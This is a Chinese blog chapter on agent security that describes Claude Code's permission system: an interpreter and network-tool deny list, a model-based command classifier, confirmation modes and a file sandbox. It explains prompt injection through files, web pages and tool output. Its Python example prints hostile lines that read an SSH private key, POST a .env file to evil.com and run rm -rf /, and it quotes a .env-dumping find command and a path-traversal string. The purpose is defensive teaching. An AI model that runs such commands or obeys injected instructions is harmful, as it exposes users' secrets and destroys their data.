# 12 从 Claude Code 权限系统学 Agent 安全设计

## 安全是 Agent 时代最被忽视的问题

![四层纵深防御体系](../imgs/12-sec-four-layers.png)


大部分团队做 Agent 的时候，优先级排序是这样的：先让 Agent 能干活，能调工具了、能写文件了、能执行命令了，上线。安全？以后再说。

Claude Code 的源码泄露给了我们一个难得的机会，看看一家最顶尖的 Agent 公司在安全上到底投入了多少。

答案是：**6,300 行代码，25 个文件，全代码库最重的单一模块。** 比 Agent 循环重，比消息压缩重，比 MCP 集成重。

Anthropic 用代码量投了票：**约束 Agent 不做什么，比让 Agent 能做什么更重要。**

## 1️⃣ Agent 安全和传统软件安全有什么不同

![Agent三大攻击向量](../imgs/12-sec-attack-vectors.png)


传统软件的安全模型建立在一个基础假设上：程序的行为是确定性的。你写了什么代码，它就执行什么。安全审计就是检查代码逻辑有没有漏洞。

Agent 完全打破了这个假设。

Agent 的行为是**概率性的**。同样的用户输入，模型可能选择读文件，也可能选择执行命令，还可能选择先搜索再决定。你没办法用静态分析覆盖所有可能的执行路径，因为执行路径是模型在运行时动态决定的。

更麻烦的是 **prompt injection**。恶意的输入可以通过各种渠道注入到 Agent 的上下文中：用户直接输入、读取的文件内容、抓取的网页、第三方 MCP 工具返回的数据。一旦模型被注入了恶意指令，它可能去读你的 SSH 密钥、删除你的代码、往外部服务器发送数据。

这意味着 Agent 的安全不能靠 review 代码来保证。**你必须在运行时做拦截。**

Claude Code 的做法是建了一套三层防御体系。

## 2️⃣ 第一层防线：42 条硬编码规则

![42条硬编码规则分类](../imgs/12-sec-42-rules-breakdown.png)


代码里写死了 42 条自动拒绝的 bash 模式。不管用户怎么配置，不管什么权限模式，这些命令 Agent 永远不能执行。

**跨平台代码执行类 16 条：**

python、node、deno、tsx、ruby、perl、php、lua、npx、bunx、npm run、yarn run、pnpm run、bun run、bash、sh

**Unix 专属 5 条：**

zsh、fish、eval、exec、env/xargs/sudo

**Anthropic 内部专用 8 条：**

curl、wget、git、kubectl、aws、gcloud、gsutil 等

**核心逻辑只有一条：封死所有能启动解释器的命令。**

为什么？举一个具体的例子。假设 Agent 被允许执行 `python` 命令。一旦进入 Python 解释器，它可以执行任何代码：

```python
import os
os.system("cat ~/.ssh/id_rsa")  # 读取你的 SSH 私钥
os.system("curl -X POST evil.com -d @~/.env")  # 把环境变量发到外部
os.system("rm -rf /")  # 删除所有文件
```

你在外层做的文件系统沙箱、命令白名单、路径校验，在 Python 解释器面前全部失效。因为解释器是一个完整的运行时环境，它可以绕过所有外层约束。

**这就是为什么 Claude Code 选择了最激进的策略：直接禁止所有解释器启动。** 宁可误杀，不可漏放。

业界对比：大部分开源 Agent 框架在这一层的投入基本为零。LangChain 的 Agent 可以不受限制地执行任何 bash 命令。AutoGen 同样没有内置的命令拦截。这个差距是数量级的。

## 3️⃣ 第二层防线：ML 分类器做智能判断

硬编码规则能处理已知的危险模式。但对于那些不在黑名单里、可能有风险的命令怎么办？

比如 `find . -name "*.env" -exec cat {} \;` 这条命令。它不在 42 条规则里，但它会遍历所有环境变量文件并输出内容，安全风险很高。正则匹配很难识别这种语义级别的风险。

Claude Code 引入了 **YOLO 分类器**。这个分类器通过一次 side-query 调用 Claude 模型本身，传入当前的 bash 命令、工作目录、环境信息，让模型判断这条命令是否安全。

```
输入：find . -name "*.env" -exec cat {} \;
输出：{
  matches: true,
  confidence: "high",
  reason: "遍历并输出所有 .env 文件，可能泄露敏感环境变量"
}
```

**用 AI 来约束 AI。** 模型对 bash 语义的理解远超任何正则匹配。它能理解命令的组合语义、管道链的最终效果、参数的隐含含义。

当然这一层有成本。每次工具调用都多一次 API 请求。所以 Claude Code 只在 auto 模式下启用分类器，而且要求 Opus 4.6 以上的模型才支持，低端模型的判断准确率不够。

## 4️⃣ 第三层防线：用户手动确认

最传统也最可靠的一层。Agent 想执行工具时弹窗，展示工具名、参数、影响范围，用户点 Allow 或 Deny。

Claude Code 提供了三种权限模式让用户选择：

| 模式 | 适合谁 | 工作方式 |
|------|--------|---------|
| **default** | 新手、做敏感操作时 | 每次工具调用都弹窗确认 |
| **auto** | 日常开发、老手 | ML 分类器自动判断，只有不确定的才弹窗 |
| **plan** | 跑长任务时 | 模型先输出完整计划和每步置信度，低置信度才确认 |

三种模式覆盖了从最安全到最高效的全场景。用户可以根据当前任务的风险级别灵活切换。

## 5️⃣ 一个容易被忽视的设计：Dangerous Rule Stripping

用户在 default 模式下可能配置了一些 allow 规则来避免频繁弹窗。比如 `Bash(python*)` 表示自动放行所有 python 命令。

在 default 模式下这没问题，因为即使规则放行了，用户看到弹窗还是会人工判断一下。

但如果用户切到 auto 模式，这条规则就变成了安全隐患。分类器会直接按 allow 规则放行所有 python 命令，不再弹窗。

Claude Code 的解决方案：**进入 auto 模式时自动剥离所有涉及危险模式的 allow 规则。** 你在 default 模式下放行的 python 规则，切到 auto 模式后自动失效。

**安全策略在不同权限等级之间不能简单继承。** 这个设计原则值得所有做权限系统的团队记住。

## 6️⃣ 文件系统沙箱

除了命令层面的拦截，还有文件层面的约束。

Agent 的文件操作被限制在工作目录及其子目录内。具体限制：

- 禁止 `..` 路径穿越，防止通过 `../../etc/passwd` 这种路径读取系统文件
- 写入时禁止访问 `.git` 目录，防止修改 git 历史
- 写入时禁止访问 `.claude` 目录，防止篡改权限配置
- 额外工作目录可通过配置添加

这层约束堵住了 prompt injection 通过文件操作实现的攻击。比如恶意网页内容被 Agent 读取后，注入了一条指令让 Agent 去修改 `~/.bashrc` 植入后门。沙箱直接拦截，因为 `~/.bashrc` 不在工作目录内。

## 7️⃣ 如果你在做 Agent，至少做到这几点

![安全实现四级路径](../imgs/12-sec-implementation-levels.png)


**最低标准：硬编码一份危险命令黑名单。** 不需要 42 条那么多，但 python、node、bash、eval、rm -rf 这些必须拦。30 分钟就能做完，但能堵住 80% 的安全风险。

**进阶：加文件系统沙箱。** Agent 的文件操作限制在工作目录内，禁止路径穿越。对于企业级 Agent，这条是必须的。

**再进阶：分级权限。** 不同操作不同确认级别。读文件可以自动放行，写文件需要确认，执行命令需要严格审查。

**最终形态：用 AI review AI。** 引入一个独立的安全分类 Agent，对每次工具调用做风险评估。

| 级别 | 做什么 | 成本 | 覆盖率 |
|------|--------|------|--------|
| L1 | 危险命令黑名单 | 30 分钟 | 80% |
| L2 | + 文件系统沙箱 | 1-2 天 | 90% |
| L3 | + 分级权限模式 | 3-5 天 | 95% |
| L4 | + ML 安全分类器 | 1-2 周 | 99% |

Claude Code 做到了 L4。大部分开源 Agent 还在 L0。

**模型能力决定了 Agent 能做什么，权限系统决定了 Agent 不能做什么。后者比前者更重要。**
